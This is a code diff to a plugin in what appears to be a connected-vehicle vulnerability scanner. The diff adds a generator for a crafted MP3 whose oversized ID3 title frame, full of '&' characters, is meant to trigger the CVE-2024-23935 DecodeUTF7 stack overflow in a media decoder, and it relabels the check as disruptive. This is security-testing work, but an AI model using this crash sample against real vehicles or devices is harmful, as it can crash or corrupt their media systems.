@@ -1,9 +1,10 @@
 #!/usr/bin/env python3
-"""Safe CVE exposure audit PoC for connected-vehicle vulnerability intelligence."""
+"""Active validation PoC for connected-vehicle vulnerability scanning."""
 from __future__ import annotations
 
 from active_validation_core import run_active_validation
 from iv_plugin_base import IVIVulnerabilityPlugin
+from local_exp_stimulus import build_local_sample_probe, write_temp_sample
 
 
 VULN = {
@@ -70,22 +71,45 @@ VULN = {
 }
 
 
+def _write_decodeutf7_media_sample() -> str:
+    payload = (
+        b"ID3\x04\x00\x00"
+        + (0x7f).to_bytes(4, "big")
+        + b"TIT2"
+        + (0x1200).to_bytes(4, "big")
+        + b"\x00\x00"
+        + b"&" * 4608
+    )
+    return write_temp_sample("autosec_cve_2024_23935_", ".mp3", payload)
+
+
+def _decodeutf7_probe(plugin, vuln):
+    return build_local_sample_probe(
+        plugin,
+        sample_param="media_sample_path",
+        command_params=("media_decoder_cmd", "decoder_cmd", "media_player_cmd"),
+        generated_sample=_write_decodeutf7_media_sample,
+        phenomenon="crafted media metadata sample prepared for DecodeUTF7 stack-overflow observation",
+        operator_action="Run sample_path with the target decoder/player via media_decoder_cmd/decoder_cmd/media_player_cmd and observe crash, ASAN, or process restart.",
+    )
+
+
 class Poc30CVE202423935RCEAuditPlugin(IVIVulnerabilityPlugin):
     meta_display_id = 'XLSX-036'
-    meta_poc_name = 'CVE-2024-23935 内存破坏/RCE Exposure Audit'
+    meta_poc_name = 'CVE-2024-23935 内存破坏/RCE Active Validation'
     meta_cve_id = 'CVE-2024-23935'
     meta_severity = 'High'
-    meta_protocol = 'ocpp'
+    meta_protocol = 'local'
     meta_target_os = ['all']
-    meta_required_params = ['service_banner']
-    meta_profiles = ['network']
+    meta_required_params = ['software_inventory_text']
+    meta_profiles = ['local_artifact', 'network']
     meta_source_url = 'https://nvd.nist.gov/vuln/detail/CVE-2024-23935'
-    meta_attack_surface = '网络服务'
-    is_disruptive = False
-    meta_destructive_level = "Safe"
+    meta_attack_surface = 'USB/媒体文件/本地解码器'
+    is_disruptive = True
+    meta_destructive_level = "Disruptive"
 
     def check_prerequisites(self):
         return True
 
     def exploit(self):
-        return run_active_validation(self, VULN)
+        return run_active_validation(self, VULN, probe=_decodeutf7_probe)
